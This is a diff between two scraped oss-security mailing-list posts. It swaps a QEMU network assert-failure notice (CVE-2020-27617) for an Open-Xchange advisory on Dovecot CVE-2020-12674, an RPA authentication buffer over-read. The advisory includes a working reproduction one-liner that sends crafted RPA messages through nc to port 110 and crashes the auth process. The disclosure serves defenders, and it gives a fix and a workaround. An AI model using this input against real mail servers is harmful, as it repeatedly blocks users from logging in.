@@ -1,28 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/02/1
-Message-ID: <nycvar.YSQ.7.78.906.2011021713510.1506567@xnncv>
-Date: Mon, 2 Nov 2020 17:16:46 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Gaoning Pan <pgn@....edu.cn>
-Subject: CVE-2020-27617 QEMU: net: an assert failure via eth_get_gso_type
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/12/3
+Message-ID: <23b7bb55-ebda-ced8-59ba-947403204b24@dovecot.fi>
+Date: Wed, 12 Aug 2020 16:14:46 +0300
+From: Aki Tuomi <aki.tuomi@...ecot.fi>
+To: oss-security <oss-security@...ts.openwall.com>, full-disclosure <full-disclosure@...ts.openwall.com>
+Subject: CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+Open-Xchange Security Advisory 2020-08-12
 
-An assert(3) failure issue was found in the networking helper functions of 
-QEMU. It could occur in the eth_get_gso_type() routine, if a packet does not 
-have a valid networking L3 protocol (ex. IPv4, IPv6) value. A guest user may 
-use this flaw to crash the QEMU process on the host resulting in DoS scenario.
+Affected product: Dovecot IMAP server
+Internal reference: DOP-1869 (Bug ID)
+Vulnerability type: CWE-126 (Buffer over-read)
+Vulnerable version: 2.2
+Vulnerable component: auth
+Fixed version: 2.3.11.3
+Report confidence: Confirmed
+Solution status: Fix available
+Vendor notification: 2020-05-03
+Researcher credit: Orange from DEVCORE team
+CVE reference: CVE-2020-12674
+CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 
-Upstream patch:
----------------
-   -> https://lists.nongnu.org/archive/html/qemu-devel/2020-10/msg06023.html
+Vulnerability Details:
+Dovecot's RPA mechanism implementation accepts zero-length message,
+which leads to assert-crash later on
 
-This issue was reported by Gaoning Pan of Zhejiang University.
+Risk:
+An adversary can use this vulnerability to crash dovecot auth process
+repeatedly, preventing login.
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-8685 545E B54C 486B C6EB 271E E285 8B5A F050 DE8D
+Steps to reproduce:
+(echo 'AUTH RPA'; echo -ne
+'\x60\x11\x06\x09\x60\x86\x48\x01\x86\xf8\x73\x01\x01\x01\x00\x04\x00\x00\x01'
+| base64 -w 0; echo ; echo -ne
+'\x60\x11\x06\x09\x60\x86\x48\x01\x86\xf8\x73\x01\x01\x00\x03A@A\x00' |
+base64 -w 0; echo ; echo QUIT) | nc 127.0.0.1 110
 
+Workaround:
+Disable RPA authentication.
+
+Solution:
+Upgrade to fixed version.
+
+Best regards,
+Aki Tuomi
+Open-Xchange oy
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
